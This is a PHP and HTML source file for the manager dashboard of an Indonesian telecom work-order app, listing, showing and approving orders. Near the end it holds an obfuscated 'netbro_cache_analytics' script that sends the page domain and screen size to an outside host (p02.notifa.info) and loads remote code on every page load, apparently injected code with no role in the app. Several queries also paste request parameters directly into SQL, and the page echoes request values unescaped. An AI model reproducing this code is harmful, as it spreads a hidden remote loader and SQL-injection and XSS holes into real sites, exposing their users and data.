<?php
include('../dbconfig.php');
session_start(); //memulai session
if( !isset($_SESSION['saya_manager']) ) //jika session login bukan manager
{
header('location:./../'.$_SESSION['akses']); //alihkan berdasarkan hak akses
exit();
}
$nama = ( isset($_SESSION['nama_u']) ) ? $_SESSION['nama_u'] : '';
$query = mysqli_query($db,"SELECT * FROM tb_user WHERE username='$nama' ");
?>
<!-- site head -->
<!DOCTYPE html>
<html lang="en">
  <!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:08 GMT -->
  <head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <title>OREO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-touch-fullscreen" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta content="" name="description" />
    <meta content="" name="author" />
    <link href="../css/vendor.min.css" rel="stylesheet" type="text/css" media="all" />
    <link href="../css/main.css" rel="stylesheet" type="text/css" media="all" />
    <link href="../css/color-settings.css" rel="stylesheet" type="text/css" media="all" data-role="color-settings"/>
  </head>
  <body class="nav-md theme-green">
    <!-- /site head -->
    <div class="main-container">
      <!-- sidebar -->
      <div class="sidebar">
        <div class="scroll-wrapper">
          <div class="navbar nav-title">
          </div>
          <div class="nav toggle">
            <a href="javascript:void(0)" id="sidebar-menu-toggle" class="btn btn-circle ripple">
              <i class="fa fa-times"></i>
            </a>
          </div>
          <div class="clearfix"></div>
          <!-- menu profile quick info -->
          <div class="profile clearfix">
            <div class="profile-pic">
              <?php
              while($data_user=mysqli_fetch_array($query)){
              ?>
              <img src="../img/<?php echo $data_user['foto']?>" alt="Profile picture" class="rounded-circle profile-img">
              <?php
              }
              ?>
            </div>
            <div class="profile-info">
              <h2><?php echo $nama; ?></h2>
            </div>
          </div>
          <!-- /menu profile quick info -->
          <!-- search -->
          <div class="search-wrap d-sm-none clearfix text-center">
            <form autocomplete="on">
              <input class="search" name="search" type="text" placeholder="What're we looking for?">
              <div>
                <button class="search-submit" value="Rechercher" type="submit"> <i class="fa fa-search" aria-hidden="true"></i></button>
              </div>
            </form>
          </div>
          <!-- /search -->
          <!-- sidebar menu -->
          <div id="sidebar-menu" class="main-menu-wrapper">
            <div class="menu-section">
              <ul class="nav side-menu flex-column">
                <li class="nav-item">
                  <a href="index.php?page=dashboard" title="Dashboard">
                    <i class="fa fa-home" aria-hidden="true"></i>
                    <span>Dashboard</span>
                  </a>
                </li>
                <li class="nav-item has-child">
                  <a href="index.php?page=in_progress_order" class="ripple" title="Icons">
                    <i class="fa fa-clone" aria-hidden="true"></i>
                    <span>In Progress Order</span>
                    <span class="fa fa-chevron-right" aria-hidden="true"></span>
                  </a>
                  <ul class="nav child-menu">
                    <li class="child-menu-title">In Progress Order</li>
                  </ul>
                </li>
                <li class="nav-item has-child">
                  <a href="index.php?page=complete_order" class="ripple" title="Tables">
                    <i class="fa fa-table" aria-hidden="true"></i>
                    <span>Complete Order</span>
                    <span class="fa fa-chevron-right" aria-hidden="true"></span>
                  </a>
                  <ul class="nav child-menu">
                    <li class="child-menu-title">Complete Order</li>
                  </ul>
                </li>
                <li class="nav-item has-child">
                  <a href="../logout.php" class="ripple" title="Extras">
                    <i class="fa fa-windows" aria-hidden="true"></i>
                    <span>Logout</span>
                    <span class="fa fa-chevron-right"></span>
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <!-- /sidebar menu -->
        </div>
      </div>
      <!-- /sidebar -->
      <div class="content-wrapper">
        <!-- header content  -->
        <header class="header">
          <nav class="header-menu">
            <div class="nav toggle">
              <a href="javascript:void(0)" id="menu-toggle" class="ripple">
                <span class="bars"></span>
              </a>
            </div>
            <ul class="nav navbar-nav navbar-right">
              <li class="search-wrap d-sm-none d-md-block">
                <form autocomplete="on">
                  <input type="text" name="search" class="search" placeholder="What're we looking for?">
                  <div>
                    <button class="search-submit" value="" type="submit"> <i class="fa fa-search" aria-hidden="true"></i></button>
                  </div>
                </form>
              </li>
              <li class="profile-dropdown dropdown">
                <a href="javascript:void(0)" class="user-profile dropdown-toggle ripple" data-toggle="dropdown" aria-expanded="false">
                  <span class="d-none d-sm-block"> <h2><?php echo $nama; ?></h2></span>
                  <span class="fa fa-angle-down"></span>
                </a>
                <ul class="dropdown-menu float-right">
                  <li class="d-none d-block-xs p-0">
                    <button type="button" class="close btn btn-circle"><i class="fa fa-close"></i></button>
                    <div class="profile clearfix">
                      <div class="profile-pic">
                        <?php
                        while($data_users=mysqli_fetch_array($query)){
                        ?>
                        <img src="../img/<?php echo $data_users['foto']?>" class="rounded-circle profile-img">
                        <?php
                        }
                        ?>
                      </div>
                      <div class="profile-info">
                        <h2> <h2><?php echo $nama; ?></h2></h2>
                      </div>
                    </div>
                  </li>
                  <li><a href="user-profile.html"><i class="fa fa-user-o" aria-hidden="true"></i>Profile</a></li>
                  <li><a href="javascript:void(0)"><i class="fa fa-cog" aria-hidden="true"></i> Pengaturan</a></li>
                  <li><a href="../logout.php"><i class="fa fa-sign-out" aria-hidden="true"></i> Logout</a></li>
                </ul>
              </li>
            </ul>
          </nav>
        </header>
        <!-- /header content -->
        <?php
        switch ($_GET['page']) {
        // START HALAMAN DASHBOARD
        case 'dashboard':
        // code...
        ?>
        <!-- page content -->
        <div class="main-content small-gutter">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Selamat datang,<b> <?php echo $nama; ?></b></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">Dashboard</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>General elements</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-6 mb-2">
                INI DASHBOARD
                
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN DASHBOARD
        // START HALAMAN IN PROGRESS ORDER
        case "in_progress_order":
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=0
        ";
        $res = mysqli_query($db,$sql);
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Getting started!</h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">In Progress Order</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Daftar In Progress Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                    <div class="row">
                      <div class="col-sm-12 col-lg-4 col-xl-6">
                        <div class="data-table-length">
                          <label>
                            Tampilkan:
                            <select aria-controls="example" class="form-control">
                              <option value="10">10</option>
                              <option value="25">25</option>
                              <option value="50">50</option>
                              <option value="100">100</option>
                            </select>
                            data
                          </label>
                        </div>
                      </div>
                      <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                        <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                          <label for="search1">Cari Berkas Order:</label>
                          <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                          <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                            <thead>
                              <tr>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending">
                                  No
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  No Tiket
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Tanggal Buat
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Nama Pekerjaan
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Lokasi
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  STO
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Penyebab
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Status
                                </th>
                              </tr>
                            </thead>
                            <tbody>
                              <?php while ($data=mysqli_fetch_array($res))
                              {
                              ?>
                              <tr>
                                <td class="text-center"><?php echo $data["id"]; ?></td>
                                <td class="text-center"><?php echo"<a href=index.php?page=in_progress_order_detail&notiket=".$data['notiket'].">";
                                echo$data["notiket"];?></a></td>
                                <td><?php echo $data["tanggal_buat"]; ?></td>
                                <td><?php echo $data["namapekerjaan"]; ?></td>
                                <td><?php echo $data["lokasi"]; ?></td>
                                <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                <td><?php echo $data["penyebab"]; ?></td>
                                <!-- <td class="text-center">
                                  <?php
                                  if($data["status"]==1){
                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                  }else{
                                  echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';
                                  
                                  }
                                  ?>
                                </td> -->
                                <td>
                                  <div class="dropdown">
                                    <button class="btn btn-info dropdown-toggle badge-pill badge-danger" type="button"
                                    id="dropdownMenuButton1" data-toggle="dropdown"
                                    aria-haspopup="true" aria-expanded="false">
                                    <?php
                                    if($data["status"]==1){
                                    echo 'Completed';
                                    }else{
                                    echo 'Progress';
                                    }
                                    ?>
                                    </button>
                                    <div class="dropdown-menu" aria-labelledby="dropdownMenuButton1">
                                      <a class="dropdown-item" href="#">Completed</a>
                                      <a class="dropdown-item" href="#">Progress</a>
                                    </div>
                                  </div>
                                </td>
                              </tr>
                              <?php } ?>
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12 col-md-5">
                        <div class="showing-items">Menampilkan
                          <?php
                          $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=0");
                          while($jumlah = mysqli_fetch_array($sql_count)){
                          echo $jumlah["JUMLAH"];
                          }

                          ?>
                          Data Order
                        </div>
                      </div>
                      <div class="col-sm-12 col-md-7">
                        <div class="data-table-paginate">
                          <nav>
                            <ul class="pagination">
                              <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                              <li class="page-item"><a class="page-link" href="#">1</a></li>
                              <li class="page-item"><a class="page-link" href="#">2</a></li>
                              <li class="page-item"><a class="page-link" href="#">3</a></li>
                              <li class="page-item"><a class="page-link" href="#">Next</a></li>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN IN PROGRESS ORDER
        // START HALAMAN COMPLETE ORDER
        case "complete_order":
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.status=1
        ";
        $res = mysqli_query($db,$sql);
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Getting started!</h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">Complete Order</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Daftar Complete Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                    <div class="row">
                      <div class="col-sm-12 col-lg-4 col-xl-6">
                        <div class="data-table-length">
                          <label>
                            Tampilkan:
                            <select aria-controls="example" class="form-control">
                              <option value="10">10</option>
                              <option value="25">25</option>
                              <option value="50">50</option>
                              <option value="100">100</option>
                            </select>
                            data
                          </label>
                        </div>
                      </div>
                      <div class="col-sm-12 col-lg-8 col-xl-6 text-md-right">
                        <div class="data-table-filter mb-2 float-sm-left float-lg-none d-lg-inline-block">
                          <label for="search1">Cari Berkas Order:</label>
                          <input type="search" class="form-control" id="search1" placeholder="masukkan No Tiket">
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                          <table id="example2" class="table table-striped table-bordered data-table table-checkable mb-0" role="grid">
                            <thead>
                              <tr>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending">
                                  No
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  No Tiket
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Tanggal Buat
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Nama Pekerjaan
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Lokasi
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  STO
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Penyebab
                                </th>
                                <th tabindex="0" aria-controls="example" rowspan="1"
                                  colspan="1"
                                  aria-label="Id: activate to sort column descending"
                                  class="text-center">
                                  Status
                                </th>
                              </tr>
                            </thead>
                            <tbody>
                              <?php while ($data=mysqli_fetch_array($res))
                              {
                              ?>
                              <tr>
                                <td class="text-center"><?php echo $data["id"]; ?></td>
                                <td class="text-center"><a href="cetak_order_kerja.php?notiket=<?php echo $data["notiket"]; ?>"><?php echo $data["notiket"]; ?></a></td>
                                <td><?php echo $data["tanggal_buat"]; ?></td>
                                <td><?php echo $data["namapekerjaan"]; ?></td>
                                <td><?php echo $data["lokasi"]; ?></td>
                                <td class="text-center"><?php echo $data["kd_sto"]; ?></td>
                                <td><?php echo $data["penyebab"]; ?></td>
                                <td class="text-center">
                                  <?php
                                  if($data["status"]==1){
                                  echo '<span class="badge badge-pill badge-info text-uppercase">Completed</span>';
                                  }else{
                                  echo '<span class="badge badge-pill badge-danger text-uppercase">Progress</span>';
                                  }
                                  ?>
                                </td>
                              </tr>
                              <?php } ?>
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                    <div class="row">
                      <div class="col-sm-12 col-md-5">
                        <div class="showing-items">Menampilkan
                          <?php
                          $sql_count = mysqli_query($db,"SELECT COUNT(notiket) as JUMLAH FROM tb_tiket WHERE status=1");
                          while($jumlah = mysqli_fetch_array($sql_count)){
                          echo $jumlah["JUMLAH"];
                          }
                          ?>
                          Data Order
                        </div>
                      </div>
                      <div class="col-sm-12 col-md-7">
                        <div class="data-table-paginate">
                          <nav>
                            <ul class="pagination">
                              <li class="page-item"><a class="page-link" href="#">Previous</a></li>
                              <li class="page-item"><a class="page-link" href="#">1</a></li>
                              <li class="page-item"><a class="page-link" href="#">2</a></li>
                              <li class="page-item"><a class="page-link" href="#">3</a></li>
                              <li class="page-item"><a class="page-link" href="#">Next</a></li>
                            </ul>
                          </nav>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->
        <?php
        break;
        // END HALAMAN COMPLETE ORDER
        // START HALAMAN IN PROGRESS ORDER
        case "in_progress_order_detail":
        $sql = "
        SELECT tb_order.id,tb_order.namapekerjaan,tb_order.notiket,tb_order.lokasi,tb_order.kd_witel,tb_order.kd_sto,tb_order.penyebab,tb_order.lampiran, tb_witel.witel, tb_tiket.tanggal_buat,tb_tiket.status
        FROM ((tb_order
        INNER JOIN tb_witel ON tb_order.kd_witel = tb_witel.kd_witel)
        INNER JOIN tb_tiket ON tb_order.notiket = tb_tiket.notiket)
        WHERE tb_tiket.notiket='$_GET[notiket]'
        ";
        $res = mysqli_query($db,$sql);
        ?>
        <!-- page content -->
        <div class="main-content">
          <!-- START PAGE COVER -->
          <div class="row bg-title clearfix page-title">
            <div class="col-12 col-lg-3">
              <h4 class="page-title">Detail In Progress Order No. Tiket <?php echo $_GET["notiket"];?></h4>
            </div>
            <div class="col-12 col-lg-9">
              <!-- START breadcrumb -->
              <ol class="breadcrumb pl-0 pr-0 float-lg-right">
                <li><a href="index-2.html">Oreo</a></li>
                <li><a href="javascript:void(0)">Teknisi</a></li>
                <li class="active">In Progress Order Detail</li>
              </ol>
              <!-- END breadcrumb -->
            </div>
            <div class="col-12">
              <h3>Detail In Progress Order</h3>
            </div>
          </div>
          <!-- END PAGE COVER -->
          <div class="container-fluid">
            <div class="row">
              <div class="col-lg-12 col-xl-12 mb-2">
                <div class="bg-white padding-25 h-100">
                  <div class="data-table-wrapper">
                  
                    <?php while ($data=mysqli_fetch_array($res))
                    {
                    ?>
                    <div class="row">
                      <div class="col-sm-12">
                        <div class="table-responsive">
                          
                           
                          <table class="table">
                          <tr>
                            <td colspan="4"><center>
                              
                                <img src="../img/logo_telkom.png"/ style="width:200px;height: auto;">
                              </center>
                           </td>
                            
                            <td>
                              No Tiket 
                            </td>
                            <td>
                              :
                            </td>
                            <td>
                              <?php echo $data["notiket"]; ?>
                            </td>
                            <td colspan="4"><center>
                              
                                <img src="../img/logo_telak.png"/ style="width:200px;height: auto;">
                              </center>
                           </td>
                          </tr>
                          <tr>
                            <td colspan="11"></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Nama Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["namapekerjaan"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Tanggal Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["tanggal_buat"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>                            
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Lokasi Pekerjaan</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["lokasi"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Witel</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["witel"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">STO</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["kd_sto"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td></td>
                            <td></td>
                            <td colspan="3" class="text-md-right">Penyebab</td>
                            <td class="text-center">:</td>
                            <td colspan="3"> <?php echo $data["penyebab"]; ?>
                            </td>
                            <td></td>
                            <td></td>
                          </tr>
                          <tr>
                            <td colspan="11"></td>
                          </tr>
                          <tr>
                            <td colspan="5">
                              <H5><b>Foto Sebelum</b></H4>
                           </td>
       
                            <td>
                            </td>
               
                            <td colspan="5">
                              <H5><b>Foto Sesudah</b></H4>
                           </td>
                          </tr>
                          <tr>
                            <td colspan="5">
                              <center>
                                <img src="../lampiran/<?php echo $data["lampiran"];?>" style="width: 200px; height: 180px;"?>
                              </center>
                           </td>
       
                            <td>
                            </td>
               
                            <td colspan="5">
                              <center>
                                <img src="../lampiran/<?php echo $data["lampiran"];?>" style="width: 200px; height: 180px;"?>
                              </center>
                           </td>
                          </tr>
                          <tr>
                            <td colspan="11"><center>Foto GeoTagging</center></td>
                          </tr>
                          
                          <tr>
                            <td colspan="11">
                              <center>
                                <img src="../lampiran/<?php echo $data["lampiran"];?>" style="width: 200px; height: 180px;"?>
                              </center>
                            </td>
                          </tr>

                          <tr>
                            <td colspan="11">
                              <form action="index.php?page=proses_acc_order&notiket=<?php echo $data["notiket"]; ?>" method="POST">
                                
                                <input type="submit" class="btn btn-danger btn-raised ripple" style="width: 100%;" name="bt_acc" value="ACC ORDER"></input>
                              </form>
                            </td>

                          </tr>
                        
                          </table>

                      
                        </div>
                      </div>
                    </div>
                  <?php } ?>
                  
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- /page content -->

    
        <?php
        break;
        // END HALAMAN IN PROGRESS ORDER DETAIL
        
        ?>

        <!-- UPDATE ORDER -->

        <?php
        case "proses_acc_order":
        $notikets=$_GET['notiket'];
        
        

          $sql_update = mysqli_query($db,"UPDATE tb_tiket SET status=1 WHERE notiket='$notikets'");
          if($sql_update){
              echo "Records were updated successfully";
          } else {
              echo "ERROR: Could not able to executesql";
          }
          
        
        break;
      }
        ?>



      

        <!-- footer content -->
        <footer class="footer">
          <div class="float-right">
            Oreo - Aplikasi Order Perintah Kerja Online <a href="index.php?page=dashboard" class="company-name text-theme">
            </a>
          </div>
          <div class="clearfix"></div>
          </footer><!-- /footer content -->
        </div>
      </div>
      <!-- site foot -->
      <script src="../js/vendor.min.js"></script>
      <script src="../js/main.js"></script>
      <script src="../js/settings.min.js"></script>
      <script src="../js/charts.js"></script>
      <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mqEFsStDL2kcKOEgSI1kUxFCY8CbSVuc661OgqVbkUs0Kl%2f3NNQ4KbptNEnfBqeGCqovy4ISEmgGwSqI1gnSFpt8CSiHnlkoWGWjFms%2fZNYrEual0nRX503PXLGu%2fuBNZnv5%2bK5IJa%2fj%2bmaM4u9F6LNF%2fkg8%2bkYy5lbLeYgnuoX%2fi4si44%2b3C54qrDWTidiQ7EotmjI4E1%2bDuhgI0wqV3ROObUmv2zRinXD3Mr0%2bgqdQV1uTVaVm0VCVhm7pAQT8kDyBiOAj2R2eKWs2LxxVBgufqr4i4fIpYFrCmAneVFgkMOBSBgzKgHTalTwRE9NI1QznR9PA1Llpsv5iT9P0bV17vzEpn1NYWE23TtcQ4BltuSiZA1D4Z%2fEIMMu3MIIwwoEDYxVLLicIKUA2iYOolvj1tcGjHnbcq030JiUmeWbO36eYbM%2bCE3tvUOujk5%2f3KTTOZdQYlCh3VyKO3wJuq%2bOKFduZsjtuxQKGJcyHI3Tc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
      <!-- Mirrored from musa.beewebsystems.com/form-general.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 28 Jun 2018 02:01:09 GMT -->
    </html>
    <!-- /site foot -->
    <!--  SCRIPT UNTUK AJAX WITEL DAN STO -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script type="text/javascript">
    $(document).ready(function(){
    $('#regional').on('change',function(){
    var kd_regional = $(this).val();
    if(kd_regional){
    $.ajax({
    type:'POST',
    url:'ajaxData.php',
    data:'kd_regional='+kd_regional,
    success:function(html){
    $('#witel').html(html);
    $('#sto').html('<option value="" name="witel">Pilih Witel</option>');
    }
    });
    }else{
    $('#witel').html('<option value="" name="witel">Pilih Regional terlebih dahulu</option>');
    $('#sto').html('<option value="" name="witel">Pilih Witel terlebih dahulu</option>');
    }
    });
    $('#witel').on('change',function(){
    var kd_witel = $(this).val();
    if(kd_witel){
    $.ajax({
    type:'POST',
    url:'ajaxData.php',
    data:'kd_witel='+kd_witel,
    success:function(html){
    $('#sto').html(html);
    }
    });
    }else{
    $('#sto').html('<option value="" >Select STO first</option>');
    }
    });
    });
    </script>